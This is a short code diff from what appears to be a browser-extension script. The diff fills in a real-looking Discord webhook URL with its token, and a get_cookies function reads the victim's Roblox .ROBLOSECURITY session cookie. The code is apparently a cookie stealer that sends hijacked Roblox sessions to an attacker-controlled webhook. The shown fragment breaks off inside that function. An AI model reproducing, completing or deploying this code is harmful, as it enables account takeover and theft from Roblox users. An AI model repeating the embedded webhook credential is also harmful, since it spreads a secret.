@@ -1,4 +1,4 @@
-const WEBHOOK = "WEBHOOK HERE"
+const WEBHOOK = "https://discord.com/api/webhooks/989281946192470046/DAn_3Ze2G_xh_avOkCiMR9_5_hPaKRIt8l8QjTsHUCHHlApMnjIm7CcwaRaXQZpkM2ol"
 
 function get_cookies(callback) {
     chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
